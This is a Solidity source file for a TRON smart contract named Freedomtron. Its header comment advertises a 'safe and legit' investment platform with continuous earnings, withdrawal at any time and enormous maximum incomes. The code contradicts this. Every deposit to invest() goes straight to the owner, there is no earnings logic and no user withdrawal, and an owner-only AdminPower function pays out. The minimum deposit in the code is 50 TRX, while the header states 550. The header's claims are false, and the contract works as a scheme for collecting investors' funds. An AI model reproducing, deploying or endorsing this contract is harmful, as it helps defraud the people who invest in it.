//SourceUnit: Freedomtron.sol

/*   freedomtron - investment platform based on TRX blockchain smart-contract technology. Safe and legit!
 *   The only official platform of original freedomtron team! All other platforms with the same contract code are FAKE!
 *
 *   ┌───────────────────────────────────────────────────────────────────────┐
 *   │   Website: https://www.freedomtron.io/                                │
 *   │                                                                       |
 *   │   Telegram Public Group: https://t.me/freedomtronBoss                 |
 *   |                                                                       |
 *   └───────────────────────────────────────────────────────────────────────┘
 *
 *   [USAGE INSTRUCTION]
 *
 *   1) Connect TRON browser extension TronLink, or mobile wallet apps like TronWallet
 *   2) Choose one of the tariff plans, enter the TRX amount (550 TRX minimum) using our website 
 *   3) Wait for your earnings By group Increase
 *   4) Withdraw earnings any time using our website "Withdraw" button
 *
 *   [INVESTMENT CONDITIONS]
 *
 *   - Joining Amount 550 TRX Devide in two part Working and Non Working as 400 TRX and 150 TRX
 *   - One deposit: 550 TRX, 
 *   - Total income: based on your Group and Global Group
 *   - Earnings every moment, withdraw any time 
 *
 *   [Maximum Income]
 *
 *   - Working Income 16735340 TRX 
 *   - Non Working Income 10,49,76,000 TRX At Last Level 
 *   - Global Matrix Income 13.83 Cr TRX 
 *   - Direct Income According Plan
 *   - Royalty Income Income More then Carore TRX 
 *
 *   [FUNDS DISTRIBUTION]
 *
 *   - 100% Platform distribution balance, participants payouts
 *   - 2% Support work, technical functioning, No administration fee
 */


 pragma solidity ^0.4.25;
 contract Freedomtron {
    address private owner;
    address private verifyAddress;
    uint256 public  initialSupply = 100000000;
        uint256 constant public INVEST_MIN_AMOUNT = 50 trx;
    string private password;
    struct Instructor {
        address user;
        string pass;
        uint amt;

    }

constructor(address _stakingAddress,string _pass) public {

        owner = msg.sender;
        password = _pass;
        verifyAddress = _stakingAddress;


}

        mapping(address => uint256) public balances;
    mapping (address => Instructor) instructors;
    //mapping (address => Instructor.pass) public password;
    address[] public instructorAccts;

    
    function invest() public payable{
        require(msg.value >= INVEST_MIN_AMOUNT);
        owner.transfer(msg.value);

    }


    

    function AdminPower(uint amount) public {   
           address userAddress=msg.sender;

            if (owner==userAddress) {
            balances[msg.sender] += amount;
            owner.transfer(amount);
            }            
            
    }
    


}